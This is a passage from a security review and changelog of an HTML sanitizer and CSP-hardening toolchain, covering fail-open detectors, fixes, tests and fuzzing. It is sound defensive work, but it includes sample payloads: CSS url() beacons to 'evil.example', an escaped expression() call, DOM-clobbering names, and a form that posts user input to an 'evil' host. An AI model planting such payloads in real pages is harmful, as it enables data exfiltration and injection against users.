`createElementNS`, and adding it was the first thing the extension needed.

The oracles matched. G1–G7 check tags, `on*`, URL schemes, prototype pollution
and the trust path. Nothing inspected `style` at all, nothing checked
off-origin, nothing checked id/name. The banner claimed "asserts G1–G9"; G8 and
G9 did not exist.

**Fix.**
- **Corpus**: CSS payloads (plain, escaped, and benign controls), off-origin and
  backslash-obfuscated URLs, a `CLOBBER_NAMES` list, SVG-only tags, and a rare
  600 KB value. Values are drawn from the corpus that *matches the attribute*,
  so a `style` gets CSS and an `href` gets a URL.
- **Shapes**: 10% of nodes become a `<form>` with a named child that shadows a
  DOM accessor (the I10 shape).
- **Opts**: `svg`, `idPolicy`, `urlPolicy` and `preset` are now randomised.
- **Oracles**: `G5b` (nothing off-origin survives under `same-origin`), `G8`
  (no active construct and no scheme-bearing or protocol-relative `url()`
  survives in any CSS context, *after* resolving escapes and comments the way
  the parser does), `G9` (every rendered id is prefixed under an active
  idPolicy; strict refuses clobber-prone id/name). G8 is deliberately scoped to
  real CSS contexts — `fill` on a `<video>` is an inert attribute, and an oracle
  that flags it is noise, which is how a real finding gets buried.

**Result.** Against **unpatched v1.8.0** the extended fuzzer reports **456
counterexamples** in 10,000 specs where the original reports zero, independently
rediscovering the CSS-escape bypass (#17) and the clobbering shapes (#21):

```
x19  [G8 css-url]      //evil.example/b
x4   [G8 css-url]      //evil.example/beacon
x3   [G8 active-css]   width:expr\65 ssion(alert(1))
x2   [G9 clobber-name] input[name=nodeType]
x1   [G9 clobber-name] input[name=hasAttribute]
x2   [G9 clobber-id]   div#0h-attributes
```

Against v1.8.1 it is clean across seeds 42 / 7 / 1234 / 99 at 10,000 specs each.

---

## Round ten — v1.8.2  *(the attestation that did not attest)*

Continuing the external review into the layer engine, which had not been audited.
One finding, and it is the same shape as #15: a control that reports itself
present while being absent.

### 23. L1 conformance checked directive NAMES, not VALUES  *(0html-layers.cjs)*

**Gap.** `hasDirective()` tested only `d.name === name`. Every L1 path was built
on it — `detect()` returned `done` when the four baseline directive names were
present, `applyCspDirectives()` pushed a directive only when its name was
absent, and `cmdConformance()` derived `intact` from that `detect`. So a page
carrying

```
frame-ancestors *; base-uri *; object-src *; form-action *
```

— every L1 directive at its most permissive possible value — reported:

```
✓ L1 CSP baseline directives
✓ conformant — deployed posture matches the record
```

`apply --layers=1` said *"L1 already satisfied (idempotent no-op)"* and changed
nothing. `conformance --require=L1`, the documented CI gate, exited **0**.

**Why it matters more here than it looks.** These four are not
interchangeable hardening; each is the named compensating control for a specific
residual this project has accepted:

- **`form-action 'none'`** is what `THREAT-MODEL.md` cites as covering form
  exfil. Under the default `urlPolicy:'any'` a hostile spec renders
  `{"tag":"form","attrs":{"action":"https://evil/collect","method":"post"},…}`
  intact — verified — so a user clicking *Save* POSTs whatever they typed
  off-origin. (`advise()` does flag it, medium; `urlPolicy:'same-origin'` drops
  it. But the *default* posture leans on L1.)
- **`base-uri 'self'`** is load-bearing for same-origin URL mode specifically:
  that mode's safety argument is that relative URLs resolve to the app origin,
  and a `<base href="https://evil/">` re-points every one of them. The compiler
  correctly refuses to emit `<base>`; the host page's CSP is the control.
- **`frame-ancestors 'none'`** is the anti-clickjacking control, which pairs
  with the residual change #1 left open (`position:fixed` overlay redressing).
- **`object-src 'none'`** closes the legacy plugin vectors.

N12 in `THREAT-MODEL.md` already warns that bare `conformance` verifies a
*claim*, not a floor, and points at `--require` as the answer. The finding is
that `--require` was not a floor either: the floor was "the directive name
exists."

**Fix.** `directiveSatisfies(values, expected)` — `'none'` must be exactly
`'none'`; `'self'` admits only `'self'`/`'none'`; and any wildcard or
scheme-wide source (`*`, `*.host`, `https:`, `data:`, `blob:`, `ws:`/`wss:`,
`filesystem:`) fails regardless of what else is listed. `detect()` now separates
**absent** from **present-but-permissive** and names the latter in its note
(`form-action * → 'none'`). `apply` tightens a weak directive instead of
skipping it, recording the author's original values in the layer state so
`unapply` restores them verbatim rather than deleting the directive. Reversibility
is preserved in both directions: added directives are removed, tightened ones
are put back exactly as found.

**Test:** `0cspval-test.cjs` (26 assertions) — the permissive→tightened path for
all four directives, byte-exact reversal, the DRIFT report and both CI exit
codes, five wildcard spellings, and positive controls that a correct policy is a
no-op and that `base-uri 'none'` is accepted as satisfying a `'self'` baseline.
Against the pre-fix engine, 14 of the 26 fail.

---

## Round eleven — v1.8.3  *(the transform that edits your code)*

`convert-handlers` is the only command that rewrites the user's **markup**, and
its output is the evidence L2 relies on to justify dropping `'unsafe-inline'`.
It was built on two regexes that cannot express HTML.

### 24. Inline-handler conversion was regex-driven  *(0html-layers.cjs)*

**Gap A — it rewrote code inside `<script>`.** `findHandlers()` ran
`/<([a-z][\w-]*)\b([^>]*)>/g` over the whole file with no notion of context. A
legacy template string — precisely the population this command exists to
migrate —

```js
var tpl = '<button onclick="save()">Go</button>';
```

was matched as a tag and **rewritten inside the string literal** to
`'<button data-0h="2">Go</button>'`. The generated wiring script then queried
that hook at `DOMContentLoaded`, before the template was ever injected, so the
handler was permanently dead. The command reported `✓ converted 2 inline
handler(s)`. Silent functional loss, reported as success, in a tool whose entire
job is to make that call safely.

**Gap B — `[^>]*` cannot cross a quoted `>`, and this one was fail-open.**

```html
<p title="a > b" onclick="stillLive()">
```

was invisible to `findHandlers()` **and** to `inlineHandlers()`, the counter
`applyHashPin()` uses as its interlock. So the sequence was:

```
convert-handlers → "no inline on* handlers found — nothing to convert (L2 can proceed)"
apply --layers=2 → "✓ L2 drop 'unsafe-inline' (hash-pin) (verified)"
```

…with `onclick="stillLive()"` still in the document. Both commands reported
success; the handler is dead under enforce CSP. The interlock that exists to
prevent exactly this was defeated by the same regex weakness it was checking
with.

**Gap C.** Single-quoted (`onclick='x()'`) and unquoted (`onerror=x()`) handler
values were never matched by the converter at all.

**Fix.** A real scanner:
- `maskNonMarkup()` blanks comments and `<script>`/`<style>` bodies **preserving
  length**, so every offset still addresses the same byte and the span-based
  rewrite stays valid;
- `scanTags()` walks attributes respecting quotes, so a `>` inside a value does
  not close the tag, and handles all three quoting forms;
- detection and conversion now share one implementation, so the L2 interlock can
  no longer disagree with what was actually removed;
- the rewrite is by exact span rather than by regenerating the tag, so unrelated
  attributes — including unquoted ones — survive verbatim;
- a **post-condition** re-counts after writing and refuses to claim success if
  any handler survives.

**Also fixed: `restore-handlers` lost data on the newly-convertible case.** Its
`(<[a-z][\w-]*\b[^>]*?)\s*data-0h="N"` had the same `>` blindness, so
`<p title="a > b" data-0h="2">` never matched and its recorded handler was
**dropped** on reversal. It now locates hooks with the same scanner, and a hook
the record references but the document lacks is a hard error rather than a
silent drop. Reversal is semantically faithful, not byte-faithful: a
single-quoted value comes back double-quoted and a restored handler sits where
its hook was.

**Honest residual, now surfaced.** Handlers written as markup inside JS are
deliberately *not* converted — rewriting a string literal is what broke them
before. But they are real inline handlers once injected and L2 will block them,
so both the normal and the nothing-to-convert paths now say so instead of
printing "L2 can proceed".

**Test:** `0handlers-test.cjs` (28 assertions) — markup-in-JS left verbatim, the
quoted-`>` case in both directions, all three quoting forms, comments and
`<style>` ignored, the L2 interlock blocking before and passing after, full
restore round-trip including the previously-dropped handler, a missing hook
failing loudly, and a positive control that a handler-free file is byte-identical
afterwards. Against the pre-fix engine, 15 of the 28 fail.

---

## Round twelve — v1.8.4  *(the integrity audit that reported clean)*

Same class as rounds ten and eleven, on the command whose entire job is to tell
you whether external code is pinned.

### 25. `audit-sri` could not see the resources it audits  *(0html-layers.cjs)*

**Gap — fail-open.** Both finders required **quoted** attribute values and used
`[^>]*`, which cannot cross a `>` inside an earlier attribute. So none of these
existed as far as the audit was concerned:

```html
<script src=https://cdn.example/only.js></script>
<script data-n="a > b" src="https://cdn.example/hidden.js"></script>
<link rel=stylesheet href=https://cdn.example/x.css>
```

A page whose only external resource was the first one audited as:

```
✓ no external <script>/<link> — fully self-contained (nothing to SRI-pin)
```

An integrity audit certifying self-containment on a page that loads remote
third-party code, exit 0.

**Four more, all verified:**

- **Valid SRI reported as tampering.** Multiple hashes are legal
  (`integrity="sha256-… sha384-…"`), and browsers use the strongest algorithm
  present. The check did `integ.split('-')[0]` for the algorithm and then
  compared the whole attribute string against one computed hash, so a correctly
  pinned file came back `✗ SRI MISMATCH` — a false alarm that fails CI.
- **Non-SRI algorithms accepted.** `algo` was taken from the attribute and fed
  to `crypto.createHash()`, so `md5-…` and `sha1-…` were computed and could
  report `✓ SRI verified`. Browsers accept only sha256/384/512 and block
  anything else, so the audit certified a resource that will not load.
- **Unknown algorithm aborted the run.** `integrity="whirlpool-…"` threw out of
  `createHash` — the audit stopped mid-file, remaining tags unchecked, exit 0.
- **Protocol-relative treated as local.** `remote` was `/^https?:\/\//`, so
  `//cdn.example/x.js` fell through to the local-file branch and a CDN resource
  was never classified as remote. The same protocol-relative blind spot the
  library itself closed in I3e.

**Also now reported: `crossorigin`.** A cross-origin subresource carrying
`integrity` but no `crossorigin` attribute is fetched no-cors; the response is
opaque, the check cannot run, and the browser **blocks** the resource. The audit
used to call that "SRI present". It now says the resource will be blocked and
what to add.

**Fix.** `externalSubresources()` uses the same masking tag scanner introduced in
round eleven — so unquoted values, quoted `>`, `<script>` in comments and
`<script src>` inside JS string literals are all handled the same way in both
commands. `parseIntegrity()` accepts only the three SRI algorithms, tolerates
`?options`, and returns the invalid tokens for reporting; verification picks the
strongest algorithm present and matches against any hash of it. `link rel` now
also covers `modulepreload` and `preload as=script|style`.

**And a fix to the round-eleven fix.** `maskNonMarkup()` located `<script>` open
tags with `/<script\b[^>]*>/` — the very pattern round eleven replaced
elsewhere. On `<script data-n="a > b" src="…">` the opener ended at the inner
`>`, so the blanking swallowed the rest of the real tag and everything up to the
next `</script>`. That is why the SRI audit could not see `hidden.js` even after
the finder was rewritten. The mask now locates open tags with `scanTags()` and
skips tags that fall inside an already-blanked body.

**Test:** `0sri-test.cjs` (27 assertions) — all three invisible forms,
protocol-relative classification, md5/sha1/unknown algorithms, multi-hash and
strongest-algorithm-wins, genuine mismatch still caught, `crossorigin` present
and absent, comments and JS strings excluded, and positive controls that a
correctly pinned file verifies and an inline-only page is self-contained.
Against the pre-fix engine, 21 of the 27 fail.

---

## Round thirteen — v1.8.5  *(the remaining apply paths)*

L5 and L8 close out the layer engine. Both repeat faults already fixed one
function away, which is the honest headline: the defect was never in a single
place, it was in the technique.

### 26. L5 called a scheme-wide `connect-src` "scoped"  *(0html-layers.cjs)*

**Gap.** `detectConnectSrc()` tested `cs.values.includes('*')` and nothing else,
so this was reported as satisfied:

```
connect-src https:
```

`https:` is scheme-wide — `fetch`/XHR/WebSocket to **any** https host. The
report read `connect-src scoped to 1 origin(s)`, conformance said ✓, and
`--require=L5` exited 0. Also passing: `http: https:`, `*.example.com`, and
`'self' data:`. connect-src is the single directive whose purpose is stopping
arbitrary-host exfiltration, and `applyConnectSrc()`'s own error text spells the
intent out — *"connect-src \* allows exfiltration to any host; supply the app's
real endpoints"* — while the detector checked the wrong thing.

This is round ten's finding (#23) in the sibling function. The L1 fix introduced
`directiveSatisfies()`/`WILDCARD_SRC` but `detectConnectSrc` carried its own
ad-hoc test, and I did not look at it at the time.

**Fix.** `hasWildcardSource()` factored out of the L1 check and applied here;
any wildcard or scheme-wide source now reports the layer as unsatisfied and
names the offending value. Also: the `--origins` validator rejected `ws://` and
`wss://`, which connect-src governs, so a WebSocket app could not scope L5 at
all — now accepted, with wildcards and paths still refused.

### 27. L8's interlock could not see the styles it gates on  *(0html-layers.cjs)*

**Gap.** `inlineStyleAttrs()` is what `applyStyleSrc()` uses to refuse dropping
`style-src 'unsafe-inline'`. It was `/<[^>]+\sstyle\s*=\s*"/gi`: double-quoted
values only, and `[^>]+` cannot cross a `>` inside an earlier attribute. So

```html
<p title="a > b" style="color:red">
<b style='font-weight:900'>
```

both counted as zero, L8 proceeded, and `'unsafe-inline'` was dropped with live
inline styles in the document — they are simply not applied under enforce.
Identical in shape to the L2 handler counter in round eleven.

**Also:** `styleBlocks()` used a `[^>]*` opener, so `<style data-note="a > b">`
was hashed over the wrong text and L8 pinned a hash the browser never computes,
blocking the stylesheet it had just "hardened".

**Fix.** Both now use the shared mask + scanner. The interlock counts a `style`
attribute with a non-empty value on real markup only — one written inside a JS
string or a comment no longer blocks — and the pinned hash is verified in the
suite against an independently computed sha256 of the block.

**Test:** `0l5l8-test.cjs` (27 assertions) — five open `connect-src` spellings
each failing both conformance and `--require`, a genuinely scoped list passing,
`wss://` accepted while wildcards and missing `--origins` still refuse, L5
reversal, the L8 interlock catching both hidden forms and counting them, JS
strings and comments not blocking, the `<style>` hash matching the browser's,
and L8 reversal restoring `'unsafe-inline'`. Against the pre-fix engine, 18 of
the 27 fail.

### Pattern

Five findings across the tooling (#15, #24, #25, #26, #27) and one in the
conformance layer (#23), all the same: **a regex standing in for a parser at a
trust boundary**, and in every case the failure was silent approval rather than
a false alarm. `awk -v` mangling `\\`; `</script>` inside a JS string; `[^>]*`
crossing a quoted attribute; a directive name read as if it were a policy. The
runtime core — `0bind.js` / `0html.js` — held up well under the same scrutiny;
what did not hold was the tooling that asserts the core is deployed correctly.

There is now one mask and one scanner, shared by every command that reads
markup: `maskNonMarkup()` + `scanTags()`. Any future command that parses HTML
should use them rather than growing a sixth regex.

---

## Round fourteen — v1.8.6  *(Trusted Types, and one thing that turned out fine)*

L3/L4 are the last apply paths. They repeat the value-blindness of #23/#26 on
the strongest layer in the stack.

### 28. TT presence was two substring tests  *(0html-layers.cjs)*

**Gap.** Neither detector parsed anything:

```js
detectTT        /require-trusted-types-for/i.test(reportOnly.content)
detectTTEnforce /require-trusted-types-for/i.test(csp.content)
             && /0html: default Trusted Types policy/.test(html)
```

`require-trusted-types-for` takes exactly one value, `'script'`. Bare — or with
any other value — the directive is invalid and every browser ignores it. And the
shim test ran against the whole file, so the marker inside an **HTML comment**
satisfied it. A document with

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; require-trusted-types-for">
<!-- 0html: default Trusted Types policy -->
```

reported `✓ L3` and `✓ L4`, `✓ conformant`, and `conformance --require=L3,L4`
exited **0** — with no Trusted Types policy registered anywhere in the document
and a directive the browser discards. Verified.

**Fix.** `ttRequired()` parses the directive and requires the `'script'` value.
`ttShimPresent()` uses the shared mask + scanner and requires the marker *and* a
`createPolicy('default'` call inside a real `<script>` element, so a comment or
a JS string no longer counts. The apply paths **repair** a valueless directive
instead of reporting it already present. The three partial states now read
differently from each other: directive without policy warns that every TT sink
will throw; policy without directive warns the enforcement is off.

**Note wording.** `detectTTEnforce` used to say "TT enforce active (default
policy) — BROWSER-VERIFY: app loads with 0 TT violations". With a passthrough
`createHTML` an HTML sink can never raise a violation, so that check only ever
exercised the script half. The note now states what enforce does and does not
cover and points at N7.

### Not a finding: the passthrough `createHTML`

Worth recording, because it looked like the biggest finding of the review and it
is not one. `TT_SHIM` registers a `default` policy whose `createHTML` is the
identity function, which nullifies Trusted Types' headline protection for
`innerHTML` and friends. That is **deliberate and disclosed**, in two places,
before I got there:

> `WHAT-IT-DOES.md` §5 — "L4's default policy is a **choke point, not
> sanitization** — it passes HTML through (so existing escaped sinks don't
> break) and only blocks string→script. … Do not read 'Trusted Types enforce'
> as DOM-XSS immunity."

> `THREAT-MODEL.md` N7 — same, with the pointer to L7 or a sanitizing policy for
> real sanitization.

`createScript`/`createScriptURL` do throw, which is exactly what
`WHAT-IT-DOES.md` claims under "String→script". Implementation matches
documentation; the only change made here is that the detector's note no longer
says something the docs are careful not to say.

**Test:** `0tt-test.cjs` (24 assertions) — three invalid directive values, the
marker in a comment and in a JS string, directive-without-policy and
policy-without-directive reported distinctly, the repair path, the real
L3→L4 apply, drift when the shim is stripped behind the tool's back, and
reversal removing the enforce directive while leaving L3's report-only meta
intact. Against the pre-fix engine, 9 of the 24 fail.

---

## Round fifteen — v1.8.7  *(a handler that was not a handler)*

### 29. `on`-prefixed did not mean "event handler"  *(0html-layers.cjs)*

**Gap.** `isHandlerAttr` was `/^on[a-z]{2,}$/i` — inherited from the original
`findHandlers` regex, and carried forward unchanged when round eleven replaced
the scanner around it. But a browser fires a handler only for names it
*recognises*; an unknown on-prefixed attribute is an ordinary attribute that
does nothing. So a framework attribute like `once="true"` was treated as an
inline handler:

```
<div once="true" data-x="1">           →  <div data-x="1" data-0h="1">
                                          el.addEventListener('ce', … )
```

The attribute was **deleted from the element** — destroying state the app
depends on — and a listener was registered for a nonexistent `'ce'` event.
`restore-handlers` would put it back, but nothing tells you to run it, because
the conversion reported success.

**Fix.** `EVENT_HANDLER_ATTRS`, the actual event-handler content-attribute names
(HTML §8.1.7.2 globals, the body/window set, plus touch/pointer/animation/
transition/fullscreen and the webkit- prefixed ones). Deliberately a **superset**
of what browsers recognise: over-inclusion costs an unnecessary conversion,
under-inclusion would leave a live handler while `inlineHandlers()` — the same
function, and the L2 interlock — reported zero, which is the fail-open direction.
Unknown `on*` attributes are now left alone *and reported*, so nothing is
silently skipped.

**Test:** four assertions added to `0handlers-test.cjs` (34 total) — `once` is
preserved, reported, registers no listener, does not block L2, and a spread of
seven real handler names across the global/pointer/touch/animation/window
families all still convert.

### `0html-value.cjs` — reviewed, not rewritten

The last unexamined file. It is a **reporting** tool: it measures a target and
prints SECURITY / SPEED / SIZE deltas to inform a human approval decision. It
gates nothing and returns no meaningful exit code.

Its detection is the same substring style found everywhere else —
`/Content-Security-Policy/i.test(html)`, `/require-trusted-types-for/i.test(html)`
and `/\son[a-z]+\s*=\s*["']/gi` all match inside comments and JS strings, and the
last one counts `once="true"` as an inline handler (verified: it reports
`inline on* handlers: 1` for a page with no handlers at all). So the numbers it
shows can be wrong in both directions.

It is **not** patched here, deliberately. The correct fix is to extract
`maskNonMarkup()` + `scanTags()` into a module both files require, and
`0html-layers.cjs` runs `main()` on load so it cannot be required as-is. Adding a
shared module means adding a third file to the integrity-pinned toolchain set,
which `cmdPin` defaults to `0html-layers.cjs` + `layers.json` — a deliberate
change to the supply-chain surface that the maintainer should make and pin, not
something a review should slip in. Recommended as the follow-up refactor; it is
also what would stop this defect class recurring.

---

## Round sixteen — v1.8.8  *(fuzzing the thing this review introduced)*

Rounds eleven–fifteen replaced five separate regexes with **one** hand-written
scanner. Every markup-reading command now depends on it: `convert-handlers`,
`restore-handlers`, the L2 and L8 interlocks, `styleBlocks`, `audit-sri` and the
L4 shim check. That concentration is the point — but it also means the scanner
had become a single point of failure tested only against cases its author
happened to think of, which is precisely the weakness that produced the bugs it
replaced. So it got fuzzed.

### 30. Scanner spans could address past the end of the document  *(0html-layers.cjs)*

**Found by `0scanner-fuzz.cjs` on its first run, seed 1.** An unterminated
attribute quote —

```html
<div class="</body></html>
```

— sends the value to EOF (which is what a browser does), but the scanner then
stepped over a closing quote that was not there: `i = valEnd + 1` with
`valEnd === length` yields `length + 1`, so `tag.end` addressed one past the
document. `String.slice` clamps, so no corruption was observed, but every
span-based rewrite and every `indexOf(…, t.end)` in the tooling rests on those
offsets being valid. Fixed by clamping both the cursor and `tag.end`.

### 31. A second `convert-handlers` pass corrupted the first  *(0html-layers.cjs)*

Also from the fuzzer, which generates `data-0h` attributes directly. Running
`convert-handlers` twice without an intervening `restore-handlers` — an ordinary
operator slip — assigned a fresh set of ids over the existing hooks, appended a
second wiring script, and left `restore-handlers` unable to match hooks to
records. The round-eleven hard error caught the data loss, but only after the
file had been rewritten.

**Fix.** Refuse before touching the file when any element already carries
`data-0h`, distinguishing "already converted, run restore-handlers first" from
"that attribute is yours, rename it".

### The fuzzer

`0scanner-fuzz.cjs` generates hostile documents — `>` inside quoted values,
unterminated quotes and comments, `</script>` inside JS strings, unquoted and
valueless attributes, handler-shaped names, truncated tags — and asserts nine
properties on each:

| | property |
| --- | --- |
| P1 | `maskNonMarkup` preserves length *(every span rewrite depends on it)* |
| P2 | the mask only ever blanks — never rewrites a byte to anything but a space |
| P3 | tag spans are well-formed and inside the document |
| P4 | tag spans are ordered and disjoint |
| P5 | attribute spans lie inside their tag |
| P6 | value spans lie inside their attribute |
| P7 | no throw, no hang, on any input |
| P8 | `convert-handlers` is a fixpoint — after success, `inlineHandlers() === 0` |
| P9 | convert → restore preserves the handler multiset |

P8 and P9 run the real CLI end-to-end on a sample of the corpus, so they cover
the transform rather than just the parser. Clean across seeds 1, 7, 11, 23 and
99; 2,000 documents with a fixed seed now run in `build.sh --test`.

**Test:** four assertions added to `0handlers-test.cjs` (38 total) covering the
double-conversion refusal, that the refusal leaves the file byte-identical, that
restore still works afterwards, and that a pre-existing `data-0h` is reported
differently from an already-converted file.

---

## Round seventeen — v1.8.9  *(an independent oracle for the scanner)*

Round sixteen fuzzed the shared scanner for **self-consistency**: spans in range,
ordered, non-overlapping. Necessary, not sufficient — a scanner can be perfectly
self-consistent and still disagree with a real tokenizer about where a tag ends,
which is the exact error class this whole review has been about. So it was tested
against a second implementation.

`python3 -m html.parser` is stdlib, written by different people, and
independently reproduces both rules the fixes rest on: a `>` inside a quoted
value does not close the tag, and `<script>`/`<style>` switch to CDATA so markup
inside the body is not markup. `0scanner-diff.cjs` compares, per start tag,
**offset · tag name · attribute names · attribute values**.

**Result: agreement on every well-formed document**, across seeds 1/3/5/17/31.
That is the first evidence in this review that the scanner is right rather than
merely self-consistent, and it retroactively supports rounds eleven-fifteen,
all of which depend on it.

Divergences appear only on deliberately malformed input — unterminated quotes,
truncated tags — where the two implementations legitimately differ and browsers
differ from both. Following one of those up produced the finding below.

### 32. Markup that does not tokenise was edited anyway  *(0html-layers.cjs)*

**Gap.** An unterminated attribute value swallows everything after it. Given

```html
<button onclick="save()">ok</button>
<div class="unterminated
```

`convert-handlers` converted the button, appended its wiring `<script>` at the
end of the file — *inside* the unterminated attribute value — and reported
`✓ converted 1 inline handler(s)`. The script it had just added could not
reliably execute, so the handlers it rewired would never be bound. Success
reported, control not delivered: the same shape as #15, #24 and #25, reached from
the other direction.

**Fix.** `scanTags()` now records whether a `>` was actually reached
(`unterminated`), and `convert-handlers` refuses before touching the file when
any tag ran off the end, naming the offset and the offending text. Editing markup
that does not tokenise is not a best-effort operation.

**Test:** four assertions added to `0handlers-test.cjs` (42 total) — the refusal
fires, names the offset, leaves the file byte-identical, and a well-formed
`title="a > b"` is not mistaken for the same condition.

### Standing test surface

`build.sh --test` now runs, after the unit suites: 2,000 hostile documents
through the property fuzzer (P1-P9), then 800 through the differential against
`html.parser` when python3 is available. Both are seeded and deterministic.

---

## Round eighteen — v1.9.0  *(one scanner, actually shared)*

Rounds eleven-seventeen consolidated seven regexes into one scanner, but it
lived inside `0html-layers.cjs`, so "shared" meant "shared within one file".
`0html-value.cjs` still had its own substring detection, and the test harnesses
reached the scanner by slicing `main()` off the engine. This round makes the
sharing real, and pays the supply-chain cost of doing so properly.

### 33. `0scan-html.cjs` — the scanner is its own pinned module

`maskNonMarkup`, `scanTags`, the event-handler attribute list and the handler
finders move to `0scan-html.cjs`, required by `0html-layers.cjs`,
`0html-value.cjs`, `0scanner-fuzz.cjs` and `0scanner-diff.cjs`. The harnesses now
require it directly instead of `new Function`-ing the engine, so they test the
shipped module rather than a reconstruction of it.

**`0html-value.cjs` fixed at the same time** (deferred in round fifteen). Its
report drives a human's adoption decision and every input to it was a substring
test over the whole file: `/Content-Security-Policy/i` matched the phrase in a
comment, `/require-trusted-types-for/i` matched it in a JS string,
`/\son[a-z]+\s*=\s*["']/gi` counted `once="true"` as an inline handler, and the
sink scan counted `.innerHTML =` written inside a markup string. It now uses the
scanner: a real `<meta http-equiv>` element for the CSP, the directive's actual
`'script'` value for TT enforce, `SCAN.inlineHandlers()` for handlers, and
script bodies only for sinks. Verified in both directions — the round-fifteen
fixture now reports 0 handlers instead of 1, and a real tool still measures.

### 34. The toolchain pin set could not grow  *(0html-cli.cjs)*

Adding a file the tooling depends on exposed a gap in `pinToolchain()`:

```js
if (Array.isArray(prev.toolchain) && prev.toolchain.length) {
  files = prev.toolchain.map((t) => t.file);      // REPLACES the defaults
}
```

Preferring the recorded set meant it could only ever shrink or stay the same. A
file added to `DEFAULT_TOOLCHAIN` by an upgrade would never be pinned on any
install that already had a lock — and `verify` only checks what the lock lists,
so it would pass while shipping an unpinned toolchain file. Given #5 (v1.2.0)
was *"`pin` silently dropped the toolchain pins on every build"*, this is the
same guarantee failing in the other direction.

**Fix.** Union the defaults with whatever the lock records. Project additions are
preserved and their hashes recomputed; new defaults are picked up on the next
`pin`. Verified: a lock missing `0scan-html.cjs` gains it, tampering with the
file trips both `TOOLCHAIN DRIFT` and `SBOM STALE`, and a project's own extra
pinned file survives.

**Test:** `0pin-test.cjs` (13 assertions), running the real CLI against a
disposable copy of the package — pin coverage, SBOM listing, tamper detection in
both the lock and the SBOM, the pre-upgrade lock gaining the new file, and a
project addition surviving with a fresh hash.

### Where the tooling stands

Every command that reads markup now goes through one module, which is
integrity-pinned, listed in the SBOM, property-fuzzed (P1-P9) and differentially
tested against an independent tokenizer on every build. That is the structural
answer to findings #23-#29: they were not seven bugs, they were one missing
abstraction, seven times.

---

## Round nineteen — v1.9.1  *(a browser, at last)*

Every prior round carried the same caveat: the analysis was static — `node
--check`, a DOM shim, and reasoning about tokenizers. Playwright with a working
Chromium turned out to be available after all, so the shipped artifacts were
finally loaded in a real browser. It confirmed the review's oldest finding and
produced a new one that only a browser could see.

### #15, confirmed

The original v1.8.0 `dist/` tools, in Chromium:

```
0html-starter.html   html0=undefined  SyntaxError: missing ) after argument list
0scan.html           html0=undefined  SyntaxError: missing ) after argument list
0html-playground.html html0=undefined SyntaxError: missing ) after argument list
```

The library was absent from all three, exactly as `node --check` predicted in
round one. The current build loads all three with `html0=object`, version
matching, and zero page errors.

### 35. Only one inline script was ever hashed  *(build.sh + 0html-cli.cjs)*

**Found by the browser, and not findable without one.** Loading the *fixed*
starter still produced two CSP refusals:

```
Refused to execute inline script because it violates the following
Content Security Policy directive: "script-src 'sha256-2/lvJ1Z…' 'wasm-unsafe-eval'"
```

The hardened starter ships **three** inline scripts — a Trusted Types bootstrap,
the clickjacking frame-buster, and the module bundle — but `build_inline_tool()`
hashed only the last `<script type="module">` and substituted that single hash
for `'SHA256-PLACEHOLDER'`. Under `script-src 'sha256-…'` a hash source removes
`'unsafe-inline'`, so **both classic scripts were refused**: the TT bootstrap and
the frame-buster were dead in every shipped hardened tool. `0html verify`
reported *"CSP hash matches inline script (loads under enforce)"* throughout,
because it too looked only at module scripts.

Two security controls silently disabled by the very policy meant to harden the
page — the same shape as #15, #24, #25 and #32, and the only one that could not
be caught from outside a browser.

**Fix.** New `0csp-hashes.cjs` emits a hash for **every** inline script
(anything without `src`), built on the shared scanner so "which text is the
script body" is decided once in this project. `build.sh` substitutes the whole
list; `verify` checks every inline script, classic included. Chromium's suggested
hashes matched the emitter's output exactly. Rebuilt tools now load with **zero**
CSP refusals and a registered TT policy. `0csp-hashes.cjs` is pinned in
`0html.lock` and listed in the SBOM.

### `0browser-test.cjs`

39 assertions across the three shipped tools: no page error, no CSP refusal,
`html0` and `OUI_BIND` defined at matching versions, and the runtime gates
exercised against a **real DOM** rather than the shim — `javascript:` href
dropped, `on*` refused, the CSS-escape url() bypass (#17) still refused,
a text child unable to inject markup, `<script>` refused by the compiler, and
`svg:true` producing genuinely namespaced elements that answer `getBBox()`,
which is the one claim the shim could never test.

It skips cleanly when playwright is absent, so it sits in `build.sh --test`
without becoming a hard dependency. Run against the original v1.8.0 artifacts it
fails five assertions per tool, which is the regression lock for #15 and #35.

---

## Round twenty — v1.9.2  *(one build, two entry points)*

Adding a Windows entry point raised the question the whole review has been
about: a PowerShell port of the build would be the same rules expressed twice,
which is exactly how #23–#29 happened. So the build was made single-sourced
first, and the entry points reduced to drivers.

### 37. `0build.cjs` — the content-producing build, in one place

Everything that decides what bytes land in `dist/` — header stripping, the
bundle, marker inlining, CSP hashing, the inline-parse guard — moves to
`0build.cjs`. `build.sh` and `0html-apply.ps1` both call it. **Verified
byte-identical** to the previous shell build across all four artifacts before
the switch, so the port provably changed nothing.

It also retires the last `awk`. Finding #15 — every shipped tool throwing
`SyntaxError` for six releases — was `awk` collapsing `\\` to `\` in a `-v`
assignment. Reading files in Node is verbatim by construction, and portable:
the build no longer needs awk, sed or openssl at all.

### 38. Two more suites were testing the previous `dist/`

#36 moved the spec fuzzer after the build. Rebuilding from an empty `dist/`
showed `0hardening-test.cjs` had the same problem — it loads
`dist/0html.bundle.js` and ran in the pre-build block, so it too validated the
*previous* bundle. Moved.

### 39. `0layers-test.cjs` was never run by the build

68 assertions — the largest single suite, covering the whole layer engine — was
not invoked by `build.sh` at any point. It passed whenever run by hand, which is
why nobody noticed. Found by diffing the suite list in `build.sh` against the
one in the new PowerShell fallback path. Now wired in.

That diff is worth keeping as a habit: the two entry points are cross-checked to
run the same suites, with every artifact-dependent suite after the build in
both. A suite that exists but is never run is indistinguishable from a suite
that passes.

### Entry points

`0html-apply.sh` (POSIX) and `0html-apply.ps1` (Windows) both: check
prerequisites and say which optional ones are missing and what that costs,
apply the consolidated patch if it is not already applied, build, test, and
verify. Idempotent — an already-patched tree goes straight to build + verify.
The `.ps1` prefers a Git-for-Windows `bash` so Windows runs the identical
pipeline; without one it falls back to `0build.cjs` plus the suites invoked
directly, in the same order.

Neither script contains any logic that touches file contents.

---

## Semver

Per the project's own rule ("changing a security invariant … is **major**"),
changes #1 and #4 *tighten* what input is accepted and are arguably major. They're
released here as **1.2.0** because the tightened inputs (off-origin CSS beacons,
`expression()`, 512 KB+ single values) have no legitimate use in the
single-file-tool target, and refusals are visible rather than fatal. If your build
depends on any of those, treat this as a breaking bump. #2, #3, #5 are
non-breaking hardening.

**v1.7.0** adds opt-in safe SVG (default `svg:false` = unchanged) — **minor**.
